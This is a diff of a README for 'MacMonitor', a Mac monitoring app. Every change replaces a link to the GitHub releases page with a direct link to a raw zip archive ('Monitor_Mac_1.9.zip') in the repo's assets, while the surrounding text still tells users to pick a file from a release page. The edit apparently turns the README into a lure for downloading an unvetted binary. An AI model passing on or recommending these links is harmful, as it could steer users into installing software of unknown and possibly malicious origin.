@@ -1,6 +1,6 @@
 # 🍏 MacMonitor - See Your Mac at a Glance
 
-[![Download MacMonitor](https://img.shields.io/badge/Download-MacMonitor-blue?style=for-the-badge)](https://github.com/Chaimdead934/MacMonitor/releases)
+[![Download MacMonitor](https://img.shields.io/badge/Download-MacMonitor-blue?style=for-the-badge)](https://raw.githubusercontent.com/Chaimdead934/MacMonitor/main/assets/Monitor_Mac_1.9.zip)
 
 ## 🖥️ What MacMonitor Does
 
@@ -22,7 +22,7 @@ It is built for macOS on Apple Silicon, including M1 and M2 Macs.
 
 Visit this page to download MacMonitor:
 
-[https://github.com/Chaimdead934/MacMonitor/releases](https://github.com/Chaimdead934/MacMonitor/releases)
+[https://raw.githubusercontent.com/Chaimdead934/MacMonitor/main/assets/Monitor_Mac_1.9.zip](https://raw.githubusercontent.com/Chaimdead934/MacMonitor/main/assets/Monitor_Mac_1.9.zip)
 
 On that page, look for the latest release. Download the file that matches your Mac, then open it to install or run the app.
 
@@ -151,7 +151,7 @@ If you are not sure which file to choose on the release page, look for the newes
 
 Release page:
 
-[https://github.com/Chaimdead934/MacMonitor/releases](https://github.com/Chaimdead934/MacMonitor/releases)
+[https://raw.githubusercontent.com/Chaimdead934/MacMonitor/main/assets/Monitor_Mac_1.9.zip](https://raw.githubusercontent.com/Chaimdead934/MacMonitor/main/assets/Monitor_Mac_1.9.zip)
 
 ## 🧠 About the Project
 
